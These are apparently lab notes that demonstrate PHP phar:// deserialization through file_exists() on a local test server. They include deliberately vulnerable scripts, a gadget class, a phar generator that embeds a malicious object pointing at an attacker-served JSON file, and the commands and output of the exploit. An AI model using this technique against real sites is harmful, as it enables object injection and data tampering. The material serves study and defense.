
file_exists + phar:// + gadget === <3

#### ----------------


Build-in PHP web server
```
# php -S 127.0.0.1:8081
# php -l file.php # check for syntax errors
```


File `01.file_exists.php`
```
<?php

if (file_exists($_GET['img'])) {
   echo 'OK';
} else {
   echo 'Nope';
}
```

Usage
```
# http 127.0.0.1:8081/01.file_exists.php?img=phar://evil.phar -b
```
- `evil.phar` uploaded by user as image
- `evil.phar` contains PHP code like
```
class Users {
    $userdb = 'http://site.com/fetch.json'
}
```


#### ----------------


Users db:
```
# cat make_users_db.php
<?php
$user = ['admin' => [ 'role' => 'administrator']];
file_put_contents('users_db.json', json_encode($user));
# php make_users_db.php
# cat users_db.json && echo
{"admin":{"role":"administrator"}}
```

File `02.wakeup.php`
```
<?php
class UsersCollection {
    public $dbfile = 'users_db.json';
    public $users = [];
    function __wakeup() {
        $this->users = json_decode(
            file_get_contents($this->dbfile),
            true
        );
        print_r($this->users);
    }
}
$users = new UsersCollection();
$users->__wakeup();
```

Usage
```
# http 127.0.0.1:8081/02.wakeup.php -b
Array
(
    [admin] => Array
        (
            [role] => administrator
        )

)
```


#### ----------------


File `02.wakeup.php`
```
<?php
class UsersCollection {
    public $dbfile = 'users_db.json';
    public $users = [];

    function __wakeup() {
        // will get called
        $this->users = json_decode(file_get_contents($this->dbfile), true);
        print_r($this->users);
    }

    function __construct() {
        // will get called
    }
    function __destruct() {
        // will get called
    }
}
if (file_exists($_GET['f'])) {
    $users = new UsersCollection();
}
```

```
# http 127.0.0.1:8081/02.wakeup.php?f=users_db.json -b
```

PHAR generator `phar_generator.php`
```
<?php
class UsersCollection { }
$users = new UsersCollection();
$users->dbfile = 'http://127.0.0.1:9999/data.json';

$phar = new Phar('data.phar');
$phar->startBuffering();
$phar->addFromString('data.txt', 'data');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($users);
$phar->stopBuffering();
```

PHP-ini config must be modified to allow us create PHAR files
```
# for i in `locate cli/php.ini | grep etc`; do sed -i 's/;phar.readonly = On/phar.readonly = Off/g' $i; done
# locate cli/php.ini | grep etc | xargs grep 'phar.' | grep -vE '^;'
phar.readonly = Off
``` 

```
# php phar_generator.php
# hexdump -C data.phar
```

Generate `data.json` as well
```
# php -r '$user=["fake"=>["role"=>"dummy"]];file_put_contents("data.json",json_encode($user));'
# python -m SimpleHTTPServer 9999
```

Usage
```
# http 127.0.0.1:8081/02.wakeup.php?f=phar://data.phar -b
Array
(
    [fake] => Array
        (
            [role] => dummy
        )

)
```
